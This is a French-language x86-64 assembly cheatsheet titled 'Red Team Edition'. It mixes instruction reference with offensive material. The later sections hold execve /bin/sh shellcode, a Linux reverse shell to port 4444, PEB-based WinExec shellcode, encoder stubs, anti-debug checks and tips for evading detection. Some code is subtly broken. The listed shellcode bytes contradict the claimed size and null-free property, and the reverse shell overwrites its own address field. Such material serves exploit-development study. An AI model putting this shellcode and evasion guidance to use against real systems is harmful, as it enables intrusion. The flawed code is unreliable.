# Cheatsheet x86-64 Instructions - Red Team Edition

## Architecture x86-64

### Registres 64-bit
```
RAX, RBX, RCX, RDX      - General purpose
RSI, RDI                - Source/Destination index
RBP, RSP                - Base/Stack pointer
R8-R15                  - Extended registers

Access partiel:
RAX (64-bit) → EAX (32-bit) → AX (16-bit) → AL/AH (8-bit)
R8 (64-bit)  → R8D (32-bit) → R8W (16-bit) → R8B (8-bit)
```

### Registres spéciaux
```
RIP     - Instruction Pointer
RFLAGS  - Flags (ZF, CF, SF, OF, etc.)
FS, GS  - Segment registers (TLS, etc.)
```

### Flags importants (RFLAGS)
```
CF (Carry):     Bit 0  - Unsigned overflow
ZF (Zero):      Bit 6  - Résultat = 0
SF (Sign):      Bit 7  - Résultat négatif
OF (Overflow):  Bit 11 - Signed overflow
TF (Trap):      Bit 8  - Single-step mode
```

## Calling Conventions

### System V AMD64 ABI (Linux, macOS, BSD)
```
Arguments entiers/pointeurs: RDI, RSI, RDX, RCX, R8, R9
Arguments float:             XMM0-XMM7
Return value:                RAX (ou RDX:RAX pour 128-bit)
Callee-saved:                RBX, RBP, R12-R15
Caller-saved:                RAX, RCX, RDX, RSI, RDI, R8-R11

Stack: Aligné sur 16 bytes avant call
```

### Microsoft x64 (Windows)
```
Arguments: RCX, RDX, R8, R9 (puis stack)
Arguments float: XMM0-XMM3
Return value: RAX
Callee-saved: RBX, RBP, RDI, RSI, RSP, R12-R15
Caller-saved: RAX, RCX, RDX, R8-R11

Shadow space: 32 bytes réservés par caller
Stack: Aligné sur 16 bytes
```

## Instructions de données

### MOV
```nasm
mov rax, rbx            ; RAX = RBX
mov rax, 0x1337         ; RAX = 0x1337
mov rax, [rbx]          ; RAX = *RBX (load)
mov [rax], rbx          ; *RAX = RBX (store)
mov rax, [rbx+8]        ; RAX = *(RBX + 8)
mov rax, [rbx+rcx*8]    ; RAX = *(RBX + RCX*8)

; Zero-extend
movzx rax, al           ; RAX = (uint64_t)AL
movzx rax, ax

; Sign-extend
movsx rax, al           ; RAX = (int64_t)AL
movsxd rax, eax         ; RAX = (int64_t)EAX

; LEA (Load Effective Address - calcul sans deref)
lea rax, [rbx+8]        ; RAX = RBX + 8 (PAS de load!)
lea rax, [rbx+rcx*4]    ; RAX = RBX + RCX*4
```

### XCHG
```nasm
xchg rax, rbx           ; Swap RAX et RBX
xchg [rax], rbx         ; Atomic swap avec mémoire
```

## Arithmétique

### Addition/Soustraction
```nasm
; Addition
add rax, rbx            ; RAX += RBX
add rax, 10             ; RAX += 10
adc rax, rbx            ; RAX += RBX + CF (with carry)

; Incrément
inc rax                 ; RAX++

; Soustraction
sub rax, rbx            ; RAX -= RBX
sub rax, 5              ; RAX -= 5
sbb rax, rbx            ; RAX -= (RBX + CF)

; Décrément
dec rax                 ; RAX--

; Negation
neg rax                 ; RAX = -RAX
```

### Multiplication/Division
```nasm
; Multiplication
imul rax, rbx           ; RAX = RAX * RBX (signed)
imul rax, rbx, 10       ; RAX = RBX * 10
mul rbx                 ; RDX:RAX = RAX * RBX (unsigned, 128-bit)

; Division
idiv rbx                ; RAX = RDX:RAX / RBX (signed quotient)
                        ; RDX = RDX:RAX % RBX (remainder)
div rbx                 ; Unsigned division

; Setup pour division 64-bit
xor rdx, rdx            ; Clear RDX
mov rax, dividend
div divisor             ; RAX = quotient, RDX = remainder
```

## Logique

### Opérations bit à bit
```nasm
; AND
and rax, rbx            ; RAX &= RBX
and rax, 0xFF           ; RAX &= 0xFF
test rax, rbx           ; Set flags (RAX & RBX) sans sauvegarder

; OR
or rax, rbx             ; RAX |= RBX
or rax, 1               ; Set bit 0

; XOR
xor rax, rbx            ; RAX ^= RBX
xor rax, rax            ; RAX = 0 (idiom, plus court que mov rax, 0)

; NOT
not rax                 ; RAX = ~RAX
```

### Shifts
```nasm
; Logical shift left
shl rax, 4              ; RAX <<= 4
sal rax, 4              ; Identique à SHL

; Logical shift right
shr rax, 4              ; RAX >>= 4 (unsigned)

; Arithmetic shift right
sar rax, 4              ; RAX >>= 4 (signed, preserve sign bit)

; Rotate left/right
rol rax, 4              ; Rotate left
ror rax, 4              ; Rotate right

; Avec registre CL (low byte de RCX)
mov cl, 4
shl rax, cl             ; RAX <<= CL
```

### Bit manipulation
```nasm
; Bit test
bt rax, 5               ; Test bit 5, copie dans CF
bts rax, 5              ; Test et set bit 5
btr rax, 5              ; Test et clear bit 5
btc rax, 5              ; Test et complement bit 5

; Bit scan
bsf rax, rbx            ; RAX = index of lowest set bit in RBX
bsr rax, rbx            ; RAX = index of highest set bit in RBX
```

## Contrôle de flux

### Jumps inconditionnels
```nasm
jmp label               ; Jump absolu
jmp rax                 ; Jump indirect (RAX = adresse)
jmp [rax]               ; Jump indirect via mémoire
jmp qword [rax]         ; Explicit size
```

### Jumps conditionnels (après CMP/TEST)
```nasm
; Égalité
je label                ; Jump if equal (ZF=1)
jne label               ; Jump if not equal (ZF=0)
jz label                ; Jump if zero (alias de JE)
jnz label               ; Jump if not zero

; Signed comparisons
jg label                ; Jump if greater (>)
jge label               ; Jump if greater or equal (>=)
jl label                ; Jump if less (<)
jle label               ; Jump if less or equal (<=)

; Unsigned comparisons
ja label                ; Jump if above (>)
jae label               ; Jump if above or equal (>=)
jb label                ; Jump if below (<)
jbe label               ; Jump if below or equal (<=)

; Flags individuels
jc label                ; Jump if carry (CF=1)
jnc label               ; Jump if no carry
jo label                ; Jump if overflow (OF=1)
js label                ; Jump if sign (SF=1)
```

### Comparaison
```nasm
cmp rax, rbx            ; Set flags: RAX - RBX
cmp rax, 42             ; Set flags: RAX - 42
test rax, rax           ; Set flags: RAX & RAX (souvent pour check if zero)
```

### Loops
```nasm
loop label              ; RCX--; if RCX != 0, jump to label
loope label             ; Loop while equal (ZF=1)
loopne label            ; Loop while not equal (ZF=0)

; Usage
mov rcx, 10             ; Counter
loop_start:
    ; Code...
    loop loop_start     ; Décrémenter RCX et loop
```

## Call et Return

### Call/Return
```nasm
call function           ; Push RIP; RIP = function
call rax                ; Indirect call
call qword [rax]        ; Call via function pointer

ret                     ; Pop RIP
ret 0x10                ; Pop RIP; RSP += 0x10 (cleanup args)
```

### Prologue/Epilogue standard
```nasm
; Prologue
push rbp                ; Sauvegarder old base pointer
mov rbp, rsp            ; RBP = RSP (new frame)
sub rsp, 0x20           ; Allouer 32 bytes variables locales

; Function body...

; Epilogue
mov rsp, rbp            ; Restaurer SP
pop rbp                 ; Restaurer BP
ret                     ; Return

; Ou avec LEAVE (équivalent à mov rsp,rbp + pop rbp)
leave
ret
```

## Stack Operations

### Push/Pop
```nasm
push rax                ; RSP -= 8; *RSP = RAX
push 0x1337             ; Push immediate
pushfq                  ; Push RFLAGS

pop rax                 ; RAX = *RSP; RSP += 8
popfq                   ; Pop RFLAGS

; Multi-push (pas d'instruction native, faire plusieurs push)
push rax
push rbx
push rcx
```

## String Operations

### MOVS (Move String)
```nasm
; Setup
mov rsi, source         ; Source
mov rdi, dest           ; Destination
mov rcx, count          ; Count
cld                     ; Clear direction flag (forward)

rep movsb               ; Répéter movsb RCX fois (copy bytes)
rep movsq               ; Copy qwords

; Equivalents manuels
movsb                   ; *RDI++ = *RSI++
movsw                   ; Word (2 bytes)
movsd                   ; Dword (4 bytes)
movsq                   ; Qword (8 bytes)
```

### STOS (Store String)
```nasm
; Remplir buffer
mov rdi, buffer
mov rax, 0x90           ; Valeur (NOP)
mov rcx, count
rep stosb               ; Répéter stosb (memset-like)

stosb                   ; *RDI++ = AL
stosq                   ; *RDI++ = RAX
```

### SCAS (Scan String)
```nasm
; Chercher byte
mov rdi, buffer
mov al, 0x00            ; Chercher null terminator
mov rcx, max_len
repne scasb             ; Répéter tant que AL != *RDI

; RCX = bytes restants
; RDI = adresse après match
```

### CMPS (Compare String)
```nasm
mov rsi, str1
mov rdi, str2
mov rcx, len
repe cmpsb              ; Compare tant que égal

; ZF=1 si tous égaux
```

## Syscalls

### Syscall Linux x86-64
```nasm
; Syscall number: RAX
; Args: RDI, RSI, RDX, R10, R8, R9
; Return: RAX
; Instruction: syscall

; Exemple: write(1, "Hello\n", 6)
mov rax, 1              ; syscall write
mov rdi, 1              ; fd = stdout
lea rsi, [rel msg]      ; buf (RIP-relative)
mov rdx, 6              ; count
syscall

msg: db "Hello", 0xa
```

### Syscall Windows x64
```nasm
; Syscall number: RAX (varie par version Windows)
; Args: RCX, RDX, R8, R9 (puis stack)
; Instruction: syscall

; Exemple: NtWriteFile
mov r10, rcx            ; Backup RCX (syscall clobbers)
mov rax, syscall_num    ; Numéro syscall (ex: 0x08 pour NtWriteFile)
syscall
```

### Int 0x80 (Legacy 32-bit Linux)
```nasm
; EAX = syscall number
; Args: EBX, ECX, EDX, ESI, EDI, EBP
; Instruction: int 0x80

mov eax, 4              ; syscall write
mov ebx, 1              ; fd
mov ecx, msg
mov edx, 6
int 0x80
```

## Shellcode Techniques

### Position-Independent Code (PIC)
```nasm
; Obtenir RIP courant (call/pop trick)
call get_rip
get_rip:
    pop rbx             ; RBX = RIP
    ; Utiliser offsets relatifs depuis RBX

; Ou utiliser RIP-relative (x64 only)
lea rax, [rel data]     ; RAX = adresse de 'data'
mov rbx, [rel var]      ; Load variable

; Data section
data: db "string"
var: dq 0x1337
```

### String obfuscation
```nasm
; Construire string sur stack
xor rax, rax
push rax                ; Null terminator
mov rax, 0x68732f6e69622f ; "/bin/sh" en little-endian
push rax
mov rdi, rsp            ; RDI = "/bin/sh"

; Ou avec immediate moves
mov rax, 0x0068732f6e69622f
push rax
mov rdi, rsp
```

### Null-byte avoidance
```nasm
; Mauvais (contient null bytes)
mov rax, 0              ; 48 c7 c0 00 00 00 00

; Bon
xor rax, rax            ; 48 31 c0 (pas de null)
xor eax, eax            ; 31 c0 (encore plus court, zero haute partie)

; Au lieu de mov rax, 1
xor eax, eax
inc eax                 ; ou: push 1; pop rax
```

### XOR Decoder
```nasm
; Decoder stub
jmp short call_decoder

decoder:
    pop rsi             ; RSI = adresse shellcode encodé
    xor rcx, rcx
    add cx, shellcode_len

decode_loop:
    xor byte [rsi], 0xAA ; XOR avec clé
    inc rsi
    loop decode_loop

    jmp shellcode_start ; Jump vers shellcode décodé

call_decoder:
    call decoder
    shellcode_start:
        ; Shellcode encodé ici
        db 0xc2, 0xcf, ...
```

## Shellcode Examples

### Execve /bin/sh (Linux x64)
```nasm
global _start

section .text
_start:
    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi        ; argv = NULL
    push rsi            ; Null terminator
    mov rdi, 0x68732f6e69622f ; "/bin/sh"
    push rdi
    mov rdi, rsp        ; RDI = "/bin/sh"
    xor rdx, rdx        ; envp = NULL
    mov al, 59          ; syscall execve
    syscall

; Taille: 27 bytes
; Shellcode: \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05
```

### Reverse Shell (Linux x64)
```nasm
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rax, rax
    mov al, 41          ; syscall socket
    xor rdi, rdi
    mov dil, 2          ; AF_INET
    xor rsi, rsi
    mov sil, 1          ; SOCK_STREAM
    xor rdx, rdx
    syscall
    mov rdi, rax        ; Save sockfd

    ; connect(sockfd, &sockaddr, 16)
    xor rax, rax
    mov al, 42          ; syscall connect
    sub rsp, 16
    mov dword [rsp], 0x0100007f    ; sin_addr = 127.0.0.1
    mov word [rsp+2], 0x5c11       ; sin_port = htons(4444)
    mov word [rsp], 2              ; sin_family = AF_INET
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 16
    syscall

    ; dup2(sockfd, 0/1/2)
    xor rsi, rsi
dup_loop:
    xor rax, rax
    mov al, 33          ; syscall dup2
    syscall
    inc rsi
    cmp rsi, 3
    jne dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
```

### WinExec Shellcode (Windows x64)
```nasm
; WinExec("cmd.exe", SW_SHOW)
; Nécessite résolution de WinExec via PEB

; 1. Trouver kernel32.dll base via PEB
xor rax, rax
mov rax, [gs:0x60]      ; PEB
mov rax, [rax+0x18]     ; PEB.Ldr
mov rax, [rax+0x20]     ; InMemoryOrderModuleList
mov rax, [rax]          ; 2nd entry (kernel32.dll)
mov rax, [rax]          ; 3rd entry
mov rbx, [rax+0x20]     ; DllBase

; 2. Parse PE pour trouver WinExec (simplifié)
; [Code parsing EAT...]

; 3. Call WinExec
sub rsp, 0x28           ; Shadow space + alignment
lea rcx, [rel cmd_str]  ; lpCmdLine
mov rdx, 1              ; SW_SHOW
call rax                ; WinExec
add rsp, 0x28

cmd_str: db "cmd.exe", 0
```

## Anti-Debug Techniques

### IsDebuggerPresent check
```nasm
; PEB.BeingDebugged (offset 0x2)
xor rax, rax
mov rax, [gs:0x60]      ; PEB (Windows x64)
mov al, [rax+0x2]       ; BeingDebugged
test al, al
jnz debugger_detected
```

### RDTSC timing
```nasm
; Timing check
rdtsc                   ; EDX:EAX = timestamp counter
mov esi, eax
; Code sensible
rdtsc
sub eax, esi
cmp eax, 0x100          ; Si delta trop grand
ja debugger_detected
```

### Trap Flag detection
```nasm
; Set TF pour single-step
pushfq
or qword [rsp], 0x100   ; Set TF
popfq
; Si debugger: exception
; Sinon: exception handler custom
```

## Encoding/Obfuscation

### ADD/SUB encoder
```nasm
; Au lieu de XOR (détecté facilement)
decoder:
    pop rsi
    xor rcx, rcx
    mov cx, len
loop:
    sub byte [rsi], 0x13    ; Decoder avec SUB
    inc rsi
    loop loop
```

### Polymorphic NOP
```nasm
; Au lieu de NOP (0x90)
xchg rax, rax           ; 48 87 c0
mov rax, rax            ; 48 89 c0
lea rax, [rax]          ; 48 8d 00
```

## Instruction Encoding

### Opcodes communs
```
NOP:        0x90
RET:        0xC3
INT3:       0xCC (breakpoint)
SYSCALL:    0x0F 0x05
CALL rel:   0xE8 [4 bytes offset]
JMP rel:    0xE9 [4 bytes offset]
JMP short:  0xEB [1 byte offset]
PUSH RAX:   0x50
POP RAX:    0x58
XOR EAX,EAX: 0x31 0xC0
```

### ModR/M byte
```
Format: [Mod 2 bits][Reg 3 bits][R/M 3 bits]

Mod:
  00: [R/M]
  01: [R/M + disp8]
  10: [R/M + disp32]
  11: Direct register

Exemple: mov rax, [rbx+8]
  Opcode: 48 8B 43 08
  48: REX.W prefix (64-bit)
  8B: MOV r64, r/m64
  43: ModR/M (01 000 011) = [RBX + disp8], RAX
  08: disp8
```

## Tips Red Team

### 1. Éviter patterns détectables
```nasm
; Au lieu de:
xor eax, eax
mov al, 59
syscall

; Utiliser:
push 59
pop rax
syscall
```

### 2. Instruction substitution
```nasm
; INC peut remplacer ADD
inc rax         ; Au lieu de add rax, 1

; LEA pour arithmétique
lea rax, [rbx+rcx]  ; Au lieu de mov rax,rbx + add rax,rcx
```

### 3. Register renaming (polymorphisme)
```nasm
; Variante 1: utiliser RAX
xor eax, eax

; Variante 2: utiliser RBX
xor ebx, ebx
```

### 4. Dead code insertion
```nasm
; Insérer instructions inutiles (anti-static analysis)
nop
xor ecx, ecx    ; Dead code
nop
; Code réel
```

## Ressources

### Assembler
```bash
# NASM
nasm -f elf64 shell.asm -o shell.o
ld shell.o -o shell

# GAS (AT&T syntax)
as shell.s -o shell.o
ld shell.o -o shell

# Extract shellcode
objcopy -O binary -j .text shell shell.bin
xxd -i shell.bin
```

### Disassembler
```bash
objdump -d -M intel binary
ndisasm -b 64 shellcode.bin
radare2 -a x86 -b 64 -c 'pd 20' shellcode.bin
```
